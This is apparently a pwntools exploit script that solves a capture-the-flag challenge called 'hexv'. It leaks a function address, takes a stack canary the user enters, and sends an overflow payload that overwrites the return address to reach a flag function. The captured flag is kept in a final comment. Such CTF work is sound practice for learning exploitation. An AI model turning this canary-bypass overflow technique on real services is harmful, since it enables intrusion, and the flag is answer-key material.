#!/usr/bin/env python3

from pwn import *

p = remote('hexv.challs.pwnoh.io', 1337, ssl=True)

p.sendlineafter(b">>", b"funcs")
p.recvuntil(b"print_funcs\n")

p.recvuntil(b'0x')
flag_addr = int(p.recv(12).strip(), 16)
print(f"[+] Flag function address: {hex(flag_addr)}")

p.sendlineafter(b">>", b"dump")
output = p.recvuntil(b">>").decode()

print(output)

canary_hex = input("Canary value (0x): ").strip()
canary = int(canary_hex, 16)

print(f"Canary: {hex(canary)}")

p.sendline(b"dump " + b'A' * 115 + p64(canary) + b'A' * 8 + p64(flag_addr))
p.interactive()
#bctf{sur3_h0Pe_th1S_r3nderED_PR0pErly}